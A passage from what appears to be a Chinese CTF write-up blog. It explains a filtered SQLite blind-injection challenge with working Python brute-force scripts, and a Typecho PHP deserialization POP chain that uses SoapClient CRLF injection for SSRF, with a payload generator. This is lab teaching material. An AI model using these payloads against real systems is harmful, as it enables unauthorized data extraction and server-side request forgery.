class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;You must specify vote id&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!is_valid(<span class="variable">$id</span>)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Vote id contains dangerous chars&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// update database</span></span><br><span class="line"><span class="variable">$pdo</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;sqlite:../db/vote.db&#x27;</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$pdo</span>-&gt;query(<span class="string">&quot;UPDATE vote SET count = count + 1 WHERE id = $&#123;id&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$res</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;An error occurred while updating database&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// succeeded!</span></span><br><span class="line"><span class="keyword">echo</span> json_encode([</span><br><span class="line">  <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Thank you for your vote! The result will be published after the CTF finished.&#x27;</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure>
<p>分析源代码，发现过滤了很多sql关键字，从<code>$pdo = new PDO(&#39;sqlite:../db/vote.db&#39;);</code>,还知道了这是sqllite 的数据库，且由于过滤了” ‘所以无法判断是字符型还是整形，</p>
<p>关键点在</p>
<blockquote>
<p>$res = $pdo-&gt;query(“UPDATE vote SET count = count + 1 WHERE id = ${id}”);</p>
</blockquote>
<p><code>UPDATE</code> 成功与失败分别对应了不同的页面，那么是不是可以进行盲注，但是考虑到它过滤了 <code>&#39;</code> 和 <code>&quot;</code> 这就无法使用字符进行判断，<code>char</code> 又被过滤也无法使用 ASCII 码判断</p>
<p>这里考虑使用 <code>hex</code> 进行字符判断，将所有的的字符串组合用有限的 36 个字符表示</p>
<p><strong>1. 先考虑对 flag 16 进制长度的判断，假设它的长度为 <code>x</code>，<code>y</code> 表示 2 的 n 次方，那么 <code>x&amp;y</code> 就能表现出 <code>x</code> 二进制所有为 1 的位置，将这些 <code>y</code> 再进行或运算就可以得到完整的 <code>x</code> 的二进制，也就得到了 flag 的长度，而 <code>1&lt;&lt;n</code> 恰可以表示 2 的 n 次方</strong></p>
<p>解释下上面这段话的意思：</p>
<blockquote>
<p>&lt;&lt;   左移   用来将一个数的各二进制位全部左移N位，高位舍弃，低位补0</p>
<p>1&lt;&lt;n ，为二进制，但转化为十进制之后就是以2的倍数递增</p>
</blockquote>
<p><img src="https://img.npfs06.top/20210311173033.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<blockquote>
<p>&amp;  按位与   对两个整数值执行“位与”运算.它会将第一个操作数的每一位与第二个操作数中对应的每一位进行比较.如果两位都是 1,则相应的结果位设置为 1.否则,相应的结果位设置为 0</p>
</blockquote>
<p>两个十进制按位与会先将其转化为二进制，进行按位与后再转回十进制</p>
<p><code>x&amp;y</code>所做的其实就是遍历x中的每一位，举个例子</p>
<blockquote>
<p>x: 01000100</p>
<p>y: 00000001    //这个时候 x&amp;y的值为0</p>
<p>y: 00000010    //这个时候 x&amp;y的值为0</p>
<p>y: 00000100    /这个时候 x&amp;y的值不为0 ，这也就说明了x的第2位为1</p>
<p>……</p>
<p>遍历之后，将所有x&amp;y不为0时的y值进行或运算，也就可以得出x的二进制了</p>
</blockquote>
<p><img src="http://img.npfs06.top/20210311224630.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>那么如何构造报错语句呢？在 <code>sqlite3</code> 中，<code>abs</code> 函数有一个整数溢出的报错，如果 <code>abs</code> 的参数是 <code>-9223372036854775808</code> 就会报错，同样如果是正数也会报错</p>
<p>判断长度的 payload :</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">abs</span>(<span class="title">case</span>(<span class="title"><span class="built_in">length</span></span>(<span class="title">hex</span>((<span class="title">select</span>(<span class="variable">flag</span>)<span class="title">from</span>(<span class="variable">flag</span>))))&amp;&#123;<span class="number">1</span>&lt;&lt;<span class="variable">n</span>&#125;)<span class="title">when</span>(<span class="number">0</span>)<span class="title">then</span>(<span class="number">0</span>)<span class="title">else</span>(<span class="number">0</span><span class="variable">x8000000000000000</span>)<span class="variable">end</span>)</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://7d124b25-63ec-4b08-b8fe-7b3c6f6913fe.node3.buuoj.cn/vote.php&quot;</span></span><br><span class="line">l = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    payload = <span class="string">f&#x27;abs(case(length(hex((select(flag)from(flag))))&amp;<span class="subst">&#123;<span class="number">1</span> &lt;&lt; n&#125;</span>)when(0)then(0)else(0x8000000000000000)end)&#x27;</span></span><br><span class="line">    print(payload)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;id&#x27;</span>: payload</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r = requests.post(url=url, data=data)</span><br><span class="line">    print(r.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;occurred&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        l = l | <span class="number">1</span> &lt;&lt; n</span><br><span class="line"></span><br><span class="line">print(l)</span><br></pre></td></tr></table></figure>
<p>运行脚本，我们可以得到flag长度为84</p>
<p>接下去要做的就是逐字符进行判断，但是 <code>is_valid()</code> 过滤了大部分截取字符的函数，而且也无法用 ASCII 码判断</p>
<p>这一题对盲注语句的构造很巧妙，首先利用如下语句分别构造出 <code>ABCDEF</code> ，这样十六进制的所有字符都可以使用了，并且使用 <code>trim(0,0)</code> 来表示空字符</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 除去 12567 就是 A ，其余同理</span></span><br><span class="line">A = <span class="string">&#x27;trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)&#x27;</span></span><br><span class="line"></span><br><span class="line">C = <span class="string">&#x27;trim(hex(typeof(.1)),12567)&#x27;</span></span><br><span class="line"></span><br><span class="line">D = <span class="string">&#x27;trim(hex(0xffffffffffffffff),123)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hex(0.1) = 302E31</span></span><br><span class="line"><span class="comment"># 除去 1230 就是 E</span></span><br><span class="line">E = <span class="string">&#x27;trim(hex(0.1),1230)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hex(b&#x27;dog&#x27;) = 646F67</span></span><br><span class="line"><span class="comment"># 除去 467 就是 F</span></span><br><span class="line">F = <span class="string">&#x27;trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hex(b&#x27;koala&#x27;) = 6B6F616C61</span></span><br><span class="line"><span class="comment"># 除去 16CF 就是 B</span></span><br><span class="line">B = f<span class="string">&#x27;trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||&#123;C&#125;||&#123;F&#125;)&#x27;</span></span><br></pre></td></tr></table></figure>


<ul>
<li>然后逐字符进行爆破，已经知道 flag 格式为 <code>flag&#123;&#125;</code> ，<code>hex(b&#39;flag&#123;&#39;)==666C61677B</code> ，在其后面逐位添加十六进制字符，构成 paylaod</li>
<li>再利用 <code>replace(length(replace(flag,payload,&#39;&#39;))),84,&#39;&#39;)</code> 这个语句进行判断</li>
<li>如果 flag 不包含 payload ，那么得到的 <code>length</code> 必为 84 ，最外面的 <code>replace</code> 将返回 <code>false</code> ，通过 <code>case when then else</code> 构造 <code>abs</code> 参数为 <code>0</code> ，它不报错</li>
<li>如果 flag 包含 payload ，那么 <code>replace(flag, payload, &#39;&#39;)</code> 将 flag 中的 payload 替换为空，得到的 <code>length</code> 必不为 84 ，最外面的 <code>replace</code> 将返回 <code>true</code> ，通过 <code>case when then else</code> 构造 <code>abs</code> 参数为 <code>0x8000000000000000</code> 令其报错</li>
<li>以上就可以根据报错爆破出 flag，最后附上出题人脚本</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">URL = <span class="string">&#x27;http://9bc57f7c-3543-4dac-9a39-b0d6fe93990f.node3.buuoj.cn/vote.php&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">l = <span class="number">84</span></span><br><span class="line"></span><br><span class="line">header=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">table = &#123;&#125;</span><br><span class="line">table[<span class="string">&#x27;A&#x27;</span>] = <span class="string">&#x27;trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;C&#x27;</span>] = <span class="string">&#x27;trim(hex(typeof(.1)),12567)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;D&#x27;</span>] = <span class="string">&#x27;trim(hex(0xffffffffffffffff),123)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;E&#x27;</span>] = <span class="string">&#x27;trim(hex(0.1),1230)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;F&#x27;</span>] = <span class="string">&#x27;trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;B&#x27;</span>] = <span class="string">f&#x27;trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||<span class="subst">&#123;table[<span class="string">&quot;C&quot;</span>]&#125;</span>||<span class="subst">&#123;table[<span class="string">&quot;F&quot;</span>]&#125;</span>)&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = binascii.hexlify(<span class="string">b&#x27;flag&#123;&#x27;</span>).decode().upper()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res), l):</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;0123456789ABCDEF&#x27;</span>:</span><br><span class="line">    t = <span class="string">&#x27;||&#x27;</span>.join(c <span class="keyword">if</span> c <span class="keyword">in</span> <span class="string">&#x27;0123456789&#x27;</span> <span class="keyword">else</span> table[c] <span class="keyword">for</span> c <span class="keyword">in</span> res + x)</span><br><span class="line">    r = requests.post(URL, data=&#123;</span><br><span class="line">      <span class="string">&#x27;id&#x27;</span>: <span class="string">f&#x27;abs(case(replace(length(replace(hex((select(flag)from(flag))),<span class="subst">&#123;t&#125;</span>,trim(0,0))),<span class="subst">&#123;l&#125;</span>,trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)&#x27;</span></span><br><span class="line">    &#125;,headers=header)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;An error occurred&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">      res += x</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    time.sleep(<span class="number">0.06</span>)</span><br><span class="line">  <span class="comment"># print(f&#x27;[+] flag (&#123;i&#125;/&#123;l&#125;): &#123;res&#125;&#x27;)</span></span><br><span class="line">  print(<span class="string">&#x27;flag(hex): &#x27;</span>,res)</span><br><span class="line">  i += <span class="number">1</span></span><br><span class="line"><span class="comment"># print(&#x27;[+] flag:&#x27;, binascii.unhexlify(res).decode())</span></span><br><span class="line">print(binascii.unhexlify(res).decode())</span><br></pre></td></tr></table></figure>




<h2 id="MRCTF2020-Ezpop-Revenge"><a href="#MRCTF2020-Ezpop-Revenge" class="headerlink" title="[MRCTF2020]Ezpop_Revenge"></a>[MRCTF2020]Ezpop_Revenge</h2><p><strong>知识点：</strong></p>
<ol>
<li><strong>代码审计</strong></li>
<li><strong>SOAP 反序列化</strong></li>
<li><strong>SSRF</strong></li>
<li><strong>CRLF</strong></li>
</ol>
<p>题目打开是个 typecho 博客，<a href="http://www.zip/">www.zip</a> 泄露，下载得到源码。全局搜了一下<code>flag</code>，搜到了两个有用的东西，一个假flag，另一个是flag.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>)) session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">   <span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>]= <span class="string">&quot;MRCTF&#123;******&#125;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;我扌your problem?\nonly localhost can get flag!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>暗示这是一个 SSRF 题</p>
<p>因为是 POP 链问题，先找反序列化位点,全局搜索：unserialize</p>
<p>跟进到Plugin.php,代码比较多，简化一下，这个 Plugin.php 中的核心代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span>=<span class="string">&quot;MRCTF&#123;this_is_a_fake_flag&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$coincidence</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$db</span> = <span class="keyword">new</span> Typecho_Db(<span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;hello&#x27;</span>], <span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;world&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_Plugin</span> <span class="keyword">implements</span> <span class="title">Typecho_Plugin_Interface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>)) session_start();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;admin&#x27;</span>])) var_dump(<span class="variable">$_SESSION</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;C0incid3nc3&#x27;</span>])) &#123;</span><br><span class="line">			<span class="keyword">if</span>(preg_match(<span class="string">&quot;/file|assert|eval|[`\&#x27;~^?&lt;&gt;$%]+/i&quot;</span>,base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;C0incid3nc3&#x27;</span>])) === <span class="number">0</span>)</span><br><span class="line">				unserialize(base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;C0incid3nc3&#x27;</span>]));</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;Not that easy.&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，<code>HelloWorld_DB</code>中的<code>__wakeup</code>实例化了一个<code>Typecho_Db</code>，传给构造方法的参数是 <code>$this-&gt;coincidence</code> 数组的两个键值；下面这个类在没有设置session时会开启session，接受到<code>admin</code>参数时会输出session，并过滤了<code>C0incid3nc3</code>参数的一些RCE及特殊字符，过滤成功则反序列化<code>C0incid3nc3</code>，也需要跟进一下<code>action</code>函数<br>先跟进一下<code>Typecho_Db</code>，在var\Typecho\Db.php，此脚本核心代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$adapterName</span>, <span class="variable">$prefix</span> = <span class="string">&#x27;typecho_&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/** 获取适配器名称 */</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapterName = <span class="variable">$adapterName</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** 数据库适配器 */</span></span><br><span class="line">        <span class="variable">$adapterName</span> = <span class="string">&#x27;Typecho_Db_Adapter_&#x27;</span> . <span class="variable">$adapterName</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>(<span class="variable">$adapterName</span>, <span class="string">&#x27;isAvailable&#x27;</span>))) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">&quot;Adapter <span class="subst">&#123;$adapterName&#125;</span> is not available&quot;</span>);<span class="comment">//__toString()</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_prefix = <span class="variable">$prefix</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** 初始化内部变量 */</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化适配器对象</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> <span class="variable">$adapterName</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第九行，字符串拼接<code>__wakeup</code>实例化的<code>coincidence[&#39;hello&#39;]</code>，我们知道当类被当成字符串拼接时，那就会调用某个类的<code>__toString</code>，而这里恰好<code>$adapterName</code>可控，再搜<code>__toString()</code>，找到<code>var\Typecho\Db\Query.php</code>中定义了一大段，核心如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$_default</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;action&#x27;</span> =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;table&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;fields&#x27;</span> =&gt; <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;join&#x27;</span>   =&gt; <span class="keyword">array</span>(),</span><br><span class="line">        <span class="string">&#x27;where&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;limit&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;offset&#x27;</span> =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;order&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;group&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;having&#x27;</span>  =&gt; <span class="literal">NULL</span>,</span><br><span class="line">        <span class="string">&#x27;rows&#x27;</span>   =&gt; <span class="keyword">array</span>(),</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_sqlPreBuild</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::SELECT:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::INSERT:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;INSERT INTO &#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="string">&#x27;(&#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, array_keys(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span></span><br><span class="line">                . <span class="string">&#x27; VALUES &#x27;</span></span><br><span class="line">                . <span class="string">&#x27;(&#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, array_values(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;limit&#x27;</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::DELETE:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;DELETE FROM &#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::UPDATE:</span><br><span class="line">                <span class="variable">$columns</span> = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">                        <span class="variable">$columns</span>[] = <span class="string">&quot;<span class="subst">$key</span> = <span class="subst">$val</span>&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;UPDATE &#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="string">&#x27; SET &#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, <span class="variable">$columns</span>)</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>假如<code>Typecho_Db::SELECT（静态值）</code>的值为<code>SELECT</code>，则跟进<code>$this-&gt;_adapter</code><br>我们发现这个值我们也是可控的，这个时候我们控制<code>_adapter</code>为soap类就可以了</p>
<p><img src="https://img.npfs06.top/20210312235301.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>这个时候再访问soap的<code>parseSelect</code>方法，但是此方法并不存在，所以就会触发soap的<code>__call</code>方法来打到本地访问的目的</p>
<p><strong>POP 链逻辑：</strong></p>
<ul>
<li>反序列化 <code>HelloWorld_DB</code>，就触发了<code>__wakeup()</code> 方法，在<code>__wakeup()</code> 内实例化 <code>Typecho_Db</code> 并以 <code>$this-&gt;coincidence[&#39;hello&#39;]</code> 作为 <code>Typecho_Db</code> 的<code>__construct()</code> 方法的第一个参数；</li>
<li>PHP 的数组是可以存对象，假设 <code>$this-&gt;coincidence[&#39;hello&#39;]</code> 实例化 <code>Typecho_Db_Query</code> 对象，在 <code>Typecho_Db</code> 的构造方法中将其作为字符串，就触发了 <code>Typecho_Db_Query</code> 的<code>__toString()</code> 方法；</li>
<li>在<code>__toString()</code> 内，如果 <code>$_sqlPreBuild[&#39;action&#39;]</code> 为<code>&#39;SELECT&#39;</code> 就会触发 <code>$_adapter</code> 的 <code>parseSelect()</code> 方法；</li>
<li>将 <code>$_adapter</code> 实例化为 <code>SoapClient</code>，调用 <code>parseSelect()</code> 是不存在的方法，触发了 <code>SoapClient</code> 的<code>__call()</code> 魔术方法</li>
<li><code>__call()</code> 是实现 SSRF 的关键</li>
</ul>
<p>POP 链清楚了，exp 就很好写</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$coincidence</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence=([<span class="string">&#x27;hello&#x27;</span>=&gt;<span class="keyword">new</span> Typecho_Db_Query()]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_sqlPreBuild</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_adapter</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;action&#x27;</span>]=<span class="string">&#x27;SELECT&#x27;</span>;</span><br><span class="line">        <span class="variable">$target</span> = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line">        <span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;Cookie: PHPSESSID=i32jvsqtg8a2011jtcgefk8ko1&#x27;</span>,</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter=<span class="keyword">new</span> SoapClient(</span><br><span class="line">            <span class="literal">null</span>,</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">                <span class="string">&#x27;user_agent&#x27;</span>=&gt;str_replace(<span class="string">&#x27;^^&#x27;</span>, <span class="string">&quot;\r\n&quot;</span>,<span class="string">&#x27;npfs^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>)),<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="keyword">new</span> HelloWorld_DB());</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p>生成的payload Post传参</p>
<p><img src="https://img.npfs06.top/20210313001503.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>还有最后一个问题，这个插件现在还不知道在哪调用，不知道在哪执行就不能反序列化。在 /var/Typecho/Plugin.php 中有如下路由代码：</p>
